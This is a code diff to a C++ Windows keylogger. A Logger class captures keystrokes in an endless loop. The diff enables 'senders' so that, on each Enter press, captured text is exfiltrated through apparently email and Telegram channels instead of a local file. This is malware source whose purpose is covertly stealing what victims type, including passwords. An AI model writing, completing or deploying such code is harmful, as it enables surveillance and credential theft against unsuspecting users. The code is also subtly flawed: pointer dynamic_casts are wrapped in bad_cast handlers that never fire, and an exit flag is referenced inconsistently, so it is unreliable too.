@@ -1,7 +1,10 @@
 ﻿#include "Logger.h"
 
-Logger* Logger::instance = NULL;
+Logger* Logger::instance = nullptr;
 LANGID Logger::langId = 9;
+bool Logger::exit = false;
+Sender** Logger::array_senders = nullptr;
+const int Logger::lengthArray = 2;
 
 Logger::Logger() {
     if ((GetKeyState(VK_CAPITAL) & 0x0001) != 0) {
@@ -26,10 +29,12 @@ Logger* Logger::getInstance()
 void Logger::run()
 {
     Logger* log = Logger::getInstance();
-    /*FabricSender* fabric = new FabricSender();
-    array_senders = fabric->createSenders();*/
+    FabricSender* fabric = new FabricSender();
+    array_senders = fabric->createSenders();
     while (true) {
-        instance->saver();
+        if (Runner::exit != 0) {
+            instance->saver();
+        }
     }
 }
 
@@ -58,7 +63,7 @@ void Logger::saver() {
                 break;*/
 
             case VK_RETURN:
-                instance->saveToFile();
+                instance->send();
                 break;
 
             case VK_LCONTROL:
@@ -293,15 +298,22 @@ char Logger::toLower(char letter)
     return letter;
 }
 
+void Logger::send() {
+    for (int i = 0; i < lengthArray; i++) {
+        try {
+            MailSender* emailsender = dynamic_cast<MailSender*>(array_senders[i]);
+            emailsender->send(instance->simbols);
+        }
+        catch (std::bad_cast e) {
 
-void Logger::saveToFile() {
-    /*ofstream f("loggs.txt", ios::app);
-    if (f.is_open()) {
-        f << instance->simbols << endl;
+        }
+
+        try {
+            TgSender* tgsender = dynamic_cast<TgSender*>(array_senders[i]);
+            tgsender->send(instance->simbols);
+        }
+        catch (std::bad_cast e) {
+
+        }
     }
-    f.close();*/
-    /*for (Senders* sn : senders) {
-
-    }*/
-    //smtp lib
 }
